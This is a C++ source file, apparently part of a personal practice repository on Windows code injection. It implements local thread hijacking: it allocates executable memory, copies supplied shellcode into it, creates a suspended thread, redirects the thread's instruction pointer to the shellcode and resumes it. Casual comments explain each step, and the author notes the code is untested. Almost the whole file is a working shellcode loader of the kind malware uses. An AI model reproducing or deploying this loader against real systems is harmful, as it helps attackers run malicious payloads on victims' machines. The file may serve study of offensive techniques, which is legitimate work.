// sad today so no funny comments :( keep it professional
// hasn't been test but the concept is there 
// what to wrap it up before testing and debugging


// well if you are a stalker and looked at my previous psuh and were wondering
// wtf was i cooking 
// tbh idk i literally just realized i kept mixing up local thread hijacking and remote thread hijacking
// so yeah this is local thread hijacking now

#include <iostream>
#include "local_thread_hijacking.h"


//same process nothing fancy check classic_injection.cpp for comments 

void local_thread_hijacking(const unsigned char* shellcode, size_t shellcode_size){

    // there are two ways to do this 
    // either byn virtualallocex or virtalalloc 
    // difference being virtualallocex allocates memory to an existing process
    // virtualalloc allocates memory to the current process
    // will work on current process for now

    auto hMemory = VirtualAlloc(
        NULL, //freeball the allocations
        shellcode_size, // reserves the size of the sc
        MEM_COMMIT | MEM_RESERVE, //reserve and commit to mem 
        PAGE_EXECUTE_READWRITE //make it executable so rwx 
    );

    // sanity check
    if(hMemory == NULL){
        std::cout << "Welp we failed to reserve memeory abandon ship, the resason is: " << GetLastError() << std::endl;
        return;
    }

    // write the stolen sc to the memory of the target process
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(), // points to the target process rememeber here is the difference we are taking over an existing process
        hMemory, // points to the memory where we want to write the sc to
        shellcode, // points to me sc
        shellcode_size, // size of the sc
        &bytesWritten // pointer to variable that receives the number of bytes written
    );

    // create a thread in suspended state
    DWORD ThreadId;
    auto hThread = CreateThread(
        NULL, // default sec attributes
        0, // default stack size
        (LPTHREAD_START_ROUTINE)hMemory, // points to the starting address of the sc in the target process
        NULL, // no parameters to pass to the sc
        CREATE_SUSPENDED, // create the thread in a suspended state
        &ThreadId // pointer to variable that receives the thread identifier
    );

    // sanity check
    if(hThread == NULL){
        std::cout << "Welp we failed to create the thread, the resason is: " << GetLastError() << std::endl;
        return;
    }   

    // so we chill for a bit to let the thread settle
    Sleep(10*1000); // sleep for 10 seconds

    // a context is literally a snapshot of a thread at a given point in timee

    CONTEXT ctx{};

    // context flags tell the system what we want to do with the context
    // here we want the full context
    ctx.ContextFlags = CONTEXT_FULL; // we want the full context

    // this reads the context of the thread
    GetThreadContext(
        hThread, // handle to the thread
        &ctx // pointer to the context structure that receives the context of the thread
    );

    // so this now tells ur cpu to start executing from the address of our shellcode
    // this technically changes the reistar

    // rip the cpu register that pounts to the next instruction to be executed
    ctx.Rip = (DWORD64)hMemory; // sets the instruction pointer to the address of the shellcode
    
    // replace this thrad saved cpu registers with our modified context (Ctx)
    // technically after setting ctx and calling set thread it tells the kernal 
    // to make the thread start executing from that address.
    SetThreadContext(
        hThread, // handle to the thread
        &ctx // pointer to the context structure that contains the context of the thread
    );

    // now resume the thread since it was in a suspended state
    ResumeThread(hThread);

    // wait for thread to finish running 
    WaitForSingleObject(
        hThread,
        INFINITE // wait forever 
    );

    //clanup time
    CloseHandle(hThread);
}